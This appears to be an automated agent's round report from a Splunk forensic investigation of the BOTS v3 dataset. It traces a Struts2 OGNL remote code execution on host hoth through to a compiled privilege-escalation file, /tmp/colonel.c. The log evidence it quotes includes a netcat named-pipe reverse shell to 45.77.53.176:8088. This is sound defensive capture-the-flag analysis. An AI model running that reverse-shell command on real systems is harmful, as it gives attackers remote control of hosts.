# s1 - Q328 - Round 3
_stamped by runner: rounds_remaining=5 novel_spl=8_
**Scope:** sourcetypes ps, osquery:results, lsof, bash_history, history-2, config_file, stream:http, stream:tcp, stream:smtp; host hoth; fields host/user/process/cmdline/path/pid/_raw/uri/method/status/src/dest.
**Insight:** partial (chain proven, line 2 text not yet read)
**Candidate:** none   **Confidence:** 0

## Prior rounds
- R1: 102 sourcetypes enumerated; linux_audit/bash_history carry no tomcat8 escalation; tomcat runs on hoth.
- R2: tomcat8 PID 1313 verified on hoth; osquery process+FIM events prove /tmp/colonel → colonel.c → gcc → colonelnew → chmod +x → executed 2x as uid 111, then uid-0 rm; no file text in osquery/shell history/stream:http(hoth)/stream:tcp.
- R3: proved the RCE vector (Struts2 OGNL saveGangster.action, commands as tomcat8, reverse shell to 45.77.53.176:8088); located the two HTTP transactions that carry the file text; did not read them before tool withdrawal.

## This round
### What I ran
- `stream:http "colonel"` (no host filter) -> 0; `stream:http | stats count by host` -> hoth present (1035); field audit -> uri_path/form_data/bytes_in/bytes_out.
- `stream:http host=hoth | stats count by uri_path,status,dest_port` -> 18 URIs; saveGangster.action x15 on 8080.
- get_raw_events saveGangster -> OGNL RCE POSTs from 192.168.8.103: `mknod /tmp/backpipe p`, `/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe`.
- `stream:tcp "45.77.53.176"` -> hoth<->45.77.53.176:8088 flows; raw = flow summaries, no payload.
- `stream:smtp "colonel"` -> 0; get_sources config_file -> osquery/pear/resolv only.
- FIM on hoth (297 rows, 50 read) -> colonel chain + /etc/rc3.d/S01tomcat8 MOVED_TO via sedFl68lZ, /etc/passwd,/etc/shadow updates, useradd.
- saveGangster by time/bytes -> 15 requests; 11:08:37 bytes_in=9200 (base64 upload), 11:11:27 bytes_out=5880 (cat output).

### What it means
The chain is proven end-to-end: OGNL RCE as tomcat8 → reverse shell → /tmp/colonel (base64, 7701B) → /tmp/colonel.c (5775B) → gcc → colonelnew → chmod +x → executed as uid 111 → uid-0 activity. The escalation file is /tmp/colonel.c. Its text was not read this round, so no line 2 value.

## Assumptions
- Coverage: file text could be in (a) stream:http response bodies — saveGangster 11:11:27 bytes_out=5880 ≈ 5775B file + wrapper, UNREAD; (b) stream:http request body 11:08:37 bytes_in=9200 ≈ 7701B base64 + wrapper, UNREAD; (c) stream:tcp reverse-shell flow — flow summaries only, no payload - VERIFIED empty; (d) stream:smtp - "colonel" 0 events - VERIFIED empty; (e) config_file - only 3 system confs - VERIFIED; (f) osquery packs - all 38 enumerated, no file bodies - VERIFIED.
- Selection: /tmp/colonel.c is the file used to escalate — it is the source compiled into colonelnew, which tomcat8 executed and which preceded uid-0 activity - VERIFIED as chain; /tmp/colonel is transport, colonelnew is the binary.
- Premise: the 5880-byte response at 11:11:27 is the `cat /tmp/colonel.c` output — size matches (5775B + ~105B wrapper) and the cat ran at 11:12 per osquery - UNVERIFIED (event not read).

## Ruled out
- stream:http "colonel" anywhere — 0 events (chain used OGNL form_data, not filename URIs).
- stream:tcp reverse-shell flow — summaries only, no payload bytes.
- stream:smtp, config_file, osquery packs, shell histories, history-2, linux_audit — no file text.

## Open questions for SH
- Confirm next round should read the raw saveGangster.action event at 2018-08-20T11:11:27 UTC (bytes_out=5880) for the cat output, and the 11:08:37 request (bytes_in=9200) for the base64 body as fallback.

_Iteration cap reached: 12/12 iterations used this round — cut off, not finished._

_Partial results (runner): 3 result(s) this round returned only their first rows — `get_sourcetype_fields: {"sourcetype": "stream:http"}` (28 of 57 rows seen); `get_raw_events: {"keyword": "45.77.53.176", "limit": 10, "sourcetype": "stream:tcp"}` (5 of 10 rows seen); `run_splunk_search: index=botsv3 sourcetype=osquery:results host=hoth name="pack_fim_file_events" | stats coun…` (50 of 297 rows seen). A claim resting on them alone is UNVERIFIED._
